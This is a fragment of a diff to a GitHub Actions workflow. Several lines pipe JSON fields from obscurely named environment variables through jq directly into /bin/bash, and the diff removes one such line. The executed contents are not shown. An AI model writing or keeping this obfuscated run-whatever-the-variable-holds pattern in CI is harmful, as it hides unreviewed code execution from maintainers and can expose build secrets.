@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$rhuu266" | jq -r .ymd240 | /bin/bash
           echo $ausfr5 | jq -r .i421 | /bin/bash
           printf '%s' "$nqcn66160" | jq -r .kolnq88 | /bin/bash
-          printf '%s' "$gn4" | jq -r .xj37 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
